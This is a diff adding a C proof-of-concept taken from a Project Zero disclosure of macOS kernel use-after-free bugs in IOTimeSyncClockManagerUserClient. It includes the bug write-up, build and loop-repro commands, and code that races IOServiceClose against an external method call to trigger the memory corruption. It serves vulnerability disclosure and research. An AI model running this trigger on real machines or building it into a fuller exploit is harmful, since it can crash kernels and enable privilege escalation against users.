@@ -1,0 +1,115 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1377
+
+IOTimeSyncClockManagerUserClient provides the userspace interface for the IOTimeSyncClockManager IOService.
+
+IOTimeSyncClockManagerUserClient overrides the IOUserClient::clientClose method but it treats it like a destructor.
+IOUserClient::clientClose is not a destructor and plays no role in the lifetime management of an IOKit object.
+
+It is perfectly possible to call ::clientClose (via io_service_close) in one thread and call an external method in another
+thread at the same time.
+
+IOTimeSyncClockManagerUserClient::clientClose drops references on a bunch of OSArrays causing them to be free'd,
+it also destroys the locks which are supposed to protect access to those arrays. This leads directly to multiple UaFs
+if you also call external methods which manipulate those arrays in other threads.
+
+For an exploit some care would be required to ensure correct interleaving such that the OSArray was destroyed and then
+used *before* the lock which is supposed to be protecting the array is also destroyed, but it would be quite possible.
+
+Tested on MacOS 10.13 (17A365) on MacBookAir5,2
+*/
+
+// ianbeer
+// build: clang -o timesync_uaf timesync_uaf.c -framework IOKit -lpthread
+// repro: while true; do ./timesync_uaf; done
+
+#if 0
+MacOS multiple kernel UAFs due to incorrect IOKit object lifetime management in IOTimeSyncClockManagerUserClient
+
+IOTimeSyncClockManagerUserClient provides the userspace interface for the IOTimeSyncClockManager IOService.
+
+IOTimeSyncClockManagerUserClient overrides the IOUserClient::clientClose method but it treats it like a destructor.
+IOUserClient::clientClose is not a destructor and plays no role in the lifetime management of an IOKit object.
+
+It is perfectly possible to call ::clientClose (via io_service_close) in one thread and call an external method in another
+thread at the same time.
+
+IOTimeSyncClockManagerUserClient::clientClose drops references on a bunch of OSArrays causing them to be free'd,
+it also destroys the locks which are supposed to protect access to those arrays. This leads directly to multiple UaFs
+if you also call external methods which manipulate those arrays in other threads.
+
+For an exploit some care would be required to ensure correct interleaving such that the OSArray was destroyed and then
+used *before* the lock which is supposed to be protecting the array is also destroyed, but it would be quite possible.
+
+Tested on MacOS 10.13 (17A365) on MacBookAir5,2
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <pthread.h>
+
+#include <mach/mach.h>
+
+#include <IOKit/IOKitLib.h>
+
+int go = 0;
+
+void* thread_func(void* arg) {
+  io_object_t conn = (io_object_t)arg;
+  go = 1;
+
+  IOServiceClose(conn);
+  return 0;
+}
+
+int main(int argc, char** argv){
+  kern_return_t err;
+
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOTimeSyncClockManager"));
+
+  if (service == IO_OBJECT_NULL){
+    printf("unable to find service\n");
+    return 0;
+  }
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
+  if (err != KERN_SUCCESS){
+    printf("unable to get user client connection\n");
+    return 0;
+  }
+  
+  pthread_t thread;
+  pthread_create(&thread, NULL, thread_func, (void*)conn);
+
+  while(!go){;}
+
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 0;
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 1;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 0;
+  
+  err = IOConnectCallMethod(
+    conn,
+    1,
+    inputScalar,
+    inputScalarCnt,
+    inputStruct,
+    inputStructCnt,
+    outputScalar,
+    &outputScalarCnt,
+    outputStruct,
+    &outputStructCnt); 
+
+  printf("%x\n", err);
+
+  return 0;
+}
